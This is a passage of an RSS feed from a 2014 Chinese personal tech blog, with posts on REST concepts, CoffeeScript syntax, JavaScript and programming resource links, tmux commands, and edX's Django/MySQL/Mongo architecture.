&lt;/ul&gt;
&lt;h2&gt;状态转化（State Transfer）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。&lt;/li&gt;
&lt;li&gt;互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。客户端想要操作服务器，必须通过某种手段，让服务器端发生"状态转化"（State Transfer）。而这种转化是建立在表现层之上的，所以就是"表现层状态转化"。&lt;/li&gt;
&lt;li&gt;HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;综述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;每一个URI代表一种资源；&lt;/li&gt;
&lt;li&gt;客户端和服务器之间，传递这种资源的某种表现层；&lt;/li&gt;
&lt;li&gt;客户端通过四个HTTP动词，对服务器端资源进行操作，实现"表现层状态转化"。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;误区&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;最常见的一种设计错误，就是URI包含动词. "资源"表示一种实体，所以应该是名词，URI不应该有动词，动词应该放在HTTP协议中。&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-28:about-RESTful.html</guid><category>RESTful</category></item><item><title>计算机学习资源汇总</title><link>/free-programming.html</link><description>&lt;p&gt;与大家分享～&lt;/p&gt;
&lt;h2&gt;入口&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/free-programming-books-zh_CN"&gt;free-programming-books-zh_CN&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/bayandin/awesome-awesomeness"&gt;awesome-awesomeness&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/kahun/awesome-sysadmin"&gt;Awesome Sysadmin&lt;/a&gt; Awesome系列都很帅，可以作为资源入口&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;优质IT网站/博客&lt;/h2&gt;
&lt;h4&gt;网站&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://jianshu.io/collections"&gt;jianshu&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://news.ycombinator.com/news"&gt;Hacker News&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://group.yeeyan.org/hackernews"&gt;hackernews汉化&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://news.dbanotes.net/"&gt;Startup News&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.v2ex.com/"&gt;v2ex&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://blog.jobbole.com/"&gt;伯乐在线&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.ibm.com/developerworks/cn/opensource/os-django-mongo/"&gt;ibm&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://medium.com/"&gt;medium&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;博客&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://mindhacks.cn/"&gt;刘未鹏&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.ruanyifeng.com/blog/"&gt;阮一峰&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://coolshell.cn/"&gt;酷壳&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.vimer.cn/"&gt;vimer&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://beiyuu.com/"&gt;beiyuu&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://blog.ryanye.me/"&gt;ryanye&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://haoluobo.com/"&gt;天地一沙鸥&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://foofish.net/"&gt;foofish&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://dmyz.org/"&gt;动漫驿站&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.yinwang.org/"&gt;yinwang&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.codingnow.com/"&gt;yunfeng&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.byvoid.com/zhs/blog"&gt;byvoid&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cppblog.com/vczh/"&gt;vczh&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://pycoders-weekly-chinese.readthedocs.org/en/latest/"&gt;pycoders-weekly-zh&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://bixly.com/blog/"&gt;django方面优质博客&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/lzjun567/note"&gt;python note&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;零碎&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/ACID"&gt;ACID&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 27 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-27:free-programming.html</guid><category>web</category></item><item><title>coffeescript语法学习笔记</title><link>/js-coffeescript.html</link><description>&lt;p&gt;http://coffeescript.org/  官网&lt;/p&gt;
&lt;h2&gt;语法&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;coffee          js  
@, this       this


# Objects:
math =
  root:   Math.sqrt
  square: square
  cube:   (x) -&amp;gt; x * square x

# Functions:
square = (x) -&amp;gt; x * x

# Array comprehensions:
cubes = (math.cube num for num in list)

fill = (container, liquid = &amp;quot;coffee&amp;quot;) -&amp;gt;
  &amp;quot;Filling the #{container} with #{liquid}...&amp;quot;


$(&amp;#39;.account&amp;#39;).attr class: &amp;#39;active&amp;#39;  
对应jq
$(&amp;#39;.account&amp;#39;).attr({
  &amp;quot;class&amp;quot;: &amp;#39;active&amp;#39;
});

alert food for food in [&amp;#39;toast&amp;#39;, &amp;#39;cheese&amp;#39;, &amp;#39;wine&amp;#39;]

countdown = (num for num in [10..1])

yearsOld = max: 10, ida: 9, tim: 11

ages = for child, age of yearsOld
  &amp;quot;#{child} is #{age}&amp;quot;


alert(
  try
    nonexistent / undefined
  catch error
    &amp;quot;And the error is ... #{error}&amp;quot;
)

coffee：true, yes, on    js ：true
coffee：false, no, off   js：false
coffee：isnt js: !==

？  存在与否  ，mind？ 返回 true 或者false，

无法定义一套精简的，所以用各种语法糖来东拼西凑？
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;对象用法&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;class Animal
  constructor: (@name) -&amp;gt;

  move: (meters) -&amp;gt;
    alert @name + &amp;quot; moved #{meters}m.&amp;quot;

class Snake extends Animal
  move: -&amp;gt;
    alert &amp;quot;Slithering...&amp;quot;
    super 5

class Horse extends Animal
  move: -&amp;gt;
    alert &amp;quot;Galloping...&amp;quot;
    super 45

sam = new Snake &amp;quot;Sammy the Python&amp;quot;
tom = new Horse &amp;quot;Tommy the Palomino&amp;quot;

sam.move()
tom.move()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;对应的js&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;var Animal, Horse, Snake, sam, tom,
  __hasProp = {}.hasOwnProperty,
  __extends = function(child, parent) { for (var key in parent) { if (__hasProp.call(parent, key)) child[key] = parent[key]; } function ctor() { this.constructor = child; } ctor.prototype = parent.prototype; child.prototype = new ctor(); child.__super__ = parent.prototype; return child; };

Animal = (function() {
  function Animal(name) {
    this.name = name;
  }

  Animal.prototype.move = function(meters) {
    return alert(this.name + (&amp;quot; moved &amp;quot; + meters + &amp;quot;m.&amp;quot;));
  };

  return Animal;

})();

Snake = (function(_super) {
  __extends(Snake, _super);

  function Snake() {
    return Snake.__super__.constructor.apply(this, arguments);
  }

  Snake.prototype.move = function() {
    alert(&amp;quot;Slithering...&amp;quot;);
    return Snake.__super__.move.call(this, 5);
  };

  return Snake;

})(Animal);

Horse = (function(_super) {
  __extends(Horse, _super);

  function Horse() {
    return Horse.__super__.constructor.apply(this, arguments);
  }

  Horse.prototype.move = function() {
    alert(&amp;quot;Galloping...&amp;quot;);
    return Horse.__super__.move.call(this, 45);
  };

  return Horse;

})(Animal);

sam = new Snake(&amp;quot;Sammy the Python&amp;quot;);

tom = new Horse(&amp;quot;Tommy the Palomino&amp;quot;);

sam.move();

tom.move();
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;coffee -&amp;gt; 指向匿名函数？&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;weatherReport = (location) -&amp;gt;
  # Make an Ajax request to fetch the weather...
  [location, 72, &amp;quot;Mostly Sunny&amp;quot;]

[city, temp, forecast] = weatherReport &amp;quot;Berkeley, CA&amp;quot;



var city, forecast, temp, weatherReport, _ref;

weatherReport = function(location) {
  return [location, 72, &amp;quot;Mostly Sunny&amp;quot;];
};

_ref = weatherReport(&amp;quot;Berkeley, CA&amp;quot;), city = _ref[0], temp = _ref[1], forecast = _ref[2];
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;类似于python的拆取，解析json很方便&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;futurists =
  sculptor: &amp;quot;Umberto Boccioni&amp;quot;
  painter:  &amp;quot;Vladimir Burliuk&amp;quot;
  poet:
    name:   &amp;quot;F.T. Marinetti&amp;quot;
    address: [
      &amp;quot;Via Roma 42R&amp;quot;
      &amp;quot;Bellagio, Italy 22021&amp;quot;
    ]

{poet: {name, address: [street, city]}} = futurists
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 27 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-27:js-coffeescript.html</guid><category>web</category></item><item><title>js相关资料</title><link>/js-interesting.html</link><description>&lt;h1&gt;前端资源汇总&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dypsilon/frontend-dev-bookmarks"&gt;frontend-dev-bookmarks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;bootstrap&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://startbootstrap.com/"&gt;开箱可用&lt;/a&gt;，套上后端就行&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.bootcss.com/"&gt;bootcss&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://182.92.129.185/"&gt;微信应用框架,采用bs写的页面&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;AngularJS&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://campus.codeschool.com/courses/shaping-up-with-angular-js/level/2/section/1/video/1"&gt;官方视频&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://zouyesheng.com/angular.html#toc3"&gt;AngularJS学习笔记&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ituring.com.cn/article/13472"&gt;AngularJS入门教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;与django结合&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jrief/django-angular"&gt;django-angular&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kevinastone/django-api-rest-and-angular"&gt;django-api-rest-and-angular&lt;/a&gt;,&lt;a href="http://blog.kevinastone.com/getting-started-with-django-rest-framework-and-angularjs.html"&gt;教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;backbone.js&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jashkenas/backbone/tree/master/examples/todos"&gt;backbone&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;nodejs&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/linnovate/mean"&gt;mean&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;运行环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://jsfiddle.net/"&gt;jsfiddle&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://jsbin.com/"&gt;jsbin&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://runjs.cn/"&gt;runjs&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;心得&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;注意node版本 尽量用0.10以上，注意sudo&lt;/li&gt;
&lt;li&gt;npm install -g grunt-cli &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;coffee&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://coffeescript.org/"&gt;coffeescript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/twilson63/express-coffee"&gt;express-coffee&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;express&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://expressjs.jser.us/"&gt;入口&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.csser.com/board/4f77e6f996ca600f78000936"&gt; Express.js 中文入门指引手册&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;requirejs&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jrburke/requirejs"&gt;require.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2012/11/require_js.html"&gt;require.js的用法&lt;/a&gt;   wu:比起如何使用更重要的是为何要用它&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;JSON-js&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/douglascrockford/JSON-js"&gt;JSON-js&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;有趣&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mozilla/pdf.js"&gt;pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hakimel/reveal.js#installation"&gt;html ppt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://slides.com/wwj718/new"&gt;在线制作&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://slides.com/explore"&gt;案例&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/NUKnightLab/TimelineJS"&gt;TimelineJS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/needim/noty"&gt;noty&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mindmup/bootstrap-wysiwyg"&gt;bootstrap-wysiwyg&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jhollingworth.github.io/bootstrap-wysihtml5/"&gt;bootstrap-wysihtml5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/daviferreira/medium-editor"&gt;medium-editor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/raphaelcruzeiro/jquery-notebook"&gt;jquery-notebook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="href=" title="https://github.com/pydanny/django-wysiwyg"&gt;django-wysiwyga&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;demo&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/tastejs/todomvc"&gt;todomvc包含各种前端框架&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 27 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-27:js-interesting.html</guid><category>web</category></item><item><title>tmux使用笔记</title><link>/screen-and-tmux.html</link><description>&lt;h2&gt;why&lt;/h2&gt;
&lt;p&gt;tmux 是一个优秀的终端复用软件，类似 GNU Screen&lt;/p&gt;
&lt;p&gt;通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台&lt;/p&gt;
&lt;p&gt;并且支持session&lt;/p&gt;
&lt;h2&gt;相关概念&lt;/h2&gt;
&lt;p&gt;有如下几个概念。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;session. session是一个特定的终端组合。输入tmux就可以打开一个新的session。&lt;/li&gt;
&lt;li&gt;window。window 为session中的终端。&lt;/li&gt;
&lt;li&gt;pane 。pane为一个window分隔出来的各个间隔，&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;常用命令&lt;/h2&gt;
&lt;p&gt;记得加前缀 ctrl+b&lt;/p&gt;
&lt;h3&gt;session操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tmux ls&lt;/code&gt; 列出所有session。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt; 选择session&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ctrl-b d&lt;/code&gt;, 退出当前session。输入&lt;code&gt;tmux attach [-t sessionname]&lt;/code&gt;重新进入该session。例如&lt;code&gt;tmux attach -t 1&lt;/code&gt;即可切换到名字为1的session。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt; 重命名当前session&lt;/li&gt;
&lt;li&gt;&lt;c-z&gt; 挂起当前session&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;window操作&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ctrl+b&lt;/code&gt;是前提操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt; 创建一个新的window&lt;/li&gt;
&lt;li&gt;&lt;code&gt;,&lt;/code&gt; 重命名当前window (切换后名字会消失 why？zsh造成的？)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt; 关闭当前window&lt;/li&gt;
&lt;li&gt;&lt;code&gt;n&lt;/code&gt; 移动到下一个窗口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p&lt;/code&gt; 移动到前一个窗口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;l&lt;/code&gt; 切换到上一个窗口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;w&lt;/code&gt; 列出所有窗口编号,并进行选择切换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;编号&lt;/code&gt; 移动到指定编号的窗口。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt; 修改窗口编号，相当于排序。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;f&lt;/code&gt; 搜索所有的窗口。非常方便的功能。如图&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;pane操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;"&lt;/code&gt; 横向分割&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt; 纵向分割&lt;/li&gt;
&lt;li&gt;&lt;code&gt;方向键&lt;/code&gt; 在pane直接移动&lt;/li&gt;
&lt;li&gt;&lt;code&gt;o&lt;/code&gt; 到下一个pane&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl+方向键&lt;/code&gt;   以1个单元格为单位移动边缘以调整当前面板大小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Alt+方向键&lt;/code&gt;    以5个单元格为单位移动边缘以调整当前面板大小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{ / }&lt;/code&gt;左右pane交换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;空格&lt;/code&gt; 横竖切换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;q&lt;/code&gt; 显示pane的编号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x&lt;/code&gt; 关闭当前pane&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;pane 聚焦当前窗口&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;开多个pane，一个页面多任务 (记得加前缀)&lt;ul&gt;
&lt;li&gt;Ctrl+o:顺时针旋转当前窗口的面板&lt;/li&gt;
&lt;li&gt;z    tmux 1.8新特性，最大化当前所在面板&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;配置&lt;/h1&gt;
&lt;p&gt;~/.tmux&lt;/p&gt;
&lt;h3&gt;翻页&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;[&lt;/code&gt; 之后按翻页键就行，mac下是fn+方向键&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;典型用例&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tmux new -s wwj # 创建命名session
tmux attach -t wwj #登录
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;结对编程&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#需要使用同个用户操作，可以建立tmux用户
tmux new-session -s insight #创建一个组会话，名为insight
tmux new-session -t insight -s wwj #新建会话wwj到insight组
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;tmux+vim&lt;/h1&gt;
&lt;p&gt;Tmux 最经典的使用场景便是用 Tmux+Vim 来做一个IDE&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.freebsdchina.org/software/t/tmux"&gt;使用tmux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://foocoder.com/blog/zhong-duan-huan-jing-zhi-tmux.html/"&gt;终端环境之tmux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/MohamedAlaa/2961058"&gt;tmux-cheatsheet&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.kancloud.cn/kancloud/tmux/62466"&gt;使用 tmux 结对编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/linux/tmux/"&gt;Tmux - Linux从业者必备利器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/86571/"&gt;文本三巨头：zsh、tmux 和 vim&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 27 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-27:screen-and-tmux.html</guid><category>ubuntu</category></item><item><title>一种网站架构方案</title><link>/bulid_website.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;毕业之后的第一份工作跟edX相关。  &lt;/p&gt;
&lt;p&gt;edX是哈佛和MIT各资助了 3000万美元的开源项目，规模可想而知&lt;/p&gt;
&lt;p&gt;一个多月来，几乎每天都在翻阅源码，以便做些定制并为移动端提供接口，目前大概骨架算是构建好了，平台运行得也还算稳定&lt;/p&gt;
&lt;p&gt;这是我迄今为止折腾过最庞大的项目，粗略地把核心代码翻了一遍。算是对内部逻辑和数据流程有了大致的了解。&lt;/p&gt;
&lt;p&gt;从edX中学到许多东西，关于如何构建一个复杂度大,灵活性高的大型项目。&lt;/p&gt;
&lt;p&gt;我的确也再没见过比edX更复杂的web站点了&lt;/p&gt;
&lt;h1&gt;edX的架构&lt;/h1&gt;
&lt;p&gt;我后边要提到的架构方案结合edX来说可能比较容易说清楚它的意义和特性，这部分不应该忽略。&lt;/p&gt;
&lt;p&gt;这实际上提供了为何需要这种架构的理由，如果我们做的只是一个博客或是企业官网，那么随意怎样最终都能折腾出来。&lt;/p&gt;
&lt;p&gt;我们实际上是想为高复杂度高灵活性的需求提供解决方案。&lt;/p&gt;
&lt;p&gt;关于edX的总体架构，暂时不多谈功能和逻辑上的部分，这部分可能牵扯到业务逻辑,我们点到为止&lt;/p&gt;
&lt;p&gt;在此，重点说它的技术架构。&lt;/p&gt;
&lt;p&gt;我们跟随数据流从后往前说&lt;/p&gt;
&lt;h2&gt;服务器：nginx+gunicore&lt;/h2&gt;
&lt;p&gt;这一部分没啥好说&lt;/p&gt;
&lt;p&gt;nginx负责静态文件/反向代理（外部请求转发给端口）&lt;/p&gt;
&lt;p&gt;gunicore是Python WSGI的HTTP服务器，用来跑django。&lt;/p&gt;
&lt;h2&gt;数据库：mysql，mongo&lt;/h2&gt;
&lt;p&gt;edX同时采用了mysql和mongo，关系型数据库（mysql）用来存储用户相关的信息，而mongo用来存储课程相关的信息。 (相关细节我记录在个人wiki里，暂未整理)&lt;/p&gt;
&lt;p&gt;这么做的好处是什么，两个数据库管理起来明显是要麻烦的啊。&lt;/p&gt;
&lt;p&gt;我想原因至少有两点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edX的核心框架选择了django，django自带了用户系统，强大实用，且可扩展，对于edX已经足够，而django可用的数据库目前并未包括mongo，所以得用mysql&lt;/li&gt;
&lt;li&gt;用户模型，用户与其他东西的关系，也适合用关系描述，加上django的orm，其实使用起来十分方便。此外django中有许多跟用户模块相关的优秀第三方库，诸如django-rest-framework，django-social-auth，edX用上它们，许多工作都省事多了。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是说edX由于django的原因，必须用上一个关系型数据库。&lt;/p&gt;
&lt;p&gt;pass：github上也有将mongo用作django后端数据库的第三方开源库，不过似乎社区都不活跃&lt;/p&gt;
&lt;p&gt;那么使用mongo的原因呢：
应对课程部分的复杂度。&lt;/p&gt;
&lt;p&gt;课程是edX的核心部分，我们从代码量上也可以轻易看出。mongo这种文档型/非结构型的特性，再合适不过了，数据模型的变化，根本不影响存储，类似json的树状结构数据，往数据库一丢就行，搜索也方便之极，都跟用上了orm一般方便，甚至可读性更好&lt;/p&gt;
&lt;p&gt;此外mongo也存储论坛数据，文档型的树状结构数据使用mongo极其合适，而文档型数据，很可能数据模型常随需求变化，这也是mongo用着很爽的原因。你想啊，使用关系型数据库，django1.7之前如果不用south之类的工具，每次数据模型变更，烦都烦死&lt;/p&gt;
&lt;p&gt;总结来说，使用mysql存储用户数据，可以利用django用户系统带来的便利。而使用mongo，可以方便应对灵活多变的文档型数据结构，而大多复杂数据都可以用这种树状结构描述，这也是json和xml使用广泛的原因，他们都是树状的&lt;/p&gt;
&lt;h2&gt;后端&lt;/h2&gt;
&lt;p&gt;edX网站后端使用django框架。&lt;br /&gt;
这是edX架构中我最熟悉的部分。&lt;br /&gt;
其实之所以毕业之后第一份工作选择edX,这也是重要原因。想先深入python/django&lt;br /&gt;
django是edX的核心部分，80%以上的代码都是用django写的。&lt;/p&gt;
&lt;p&gt;django是个大而全的框架，像edX这种大项目使用django，就免去了大量的杂活。&lt;/p&gt;
&lt;p&gt;此外django模板是一直为人诟病的地方，功能实在太鸡肋，于是edX使用了mako替代它，不得不说这是个明智之举，pythonic多了&lt;/p&gt;
&lt;p&gt;此外论坛部分不在edx-platform里，论坛部分单独用ruby写，对外提供api接口，django去调用接口获取数据，所以可以将论坛视为一个黑箱服务，对外而言，看去和用django写的没有区别。&lt;/p&gt;
&lt;h2&gt;前端&lt;/h2&gt;
&lt;h3&gt;前端mvc框架：backbone.js&lt;/h3&gt;
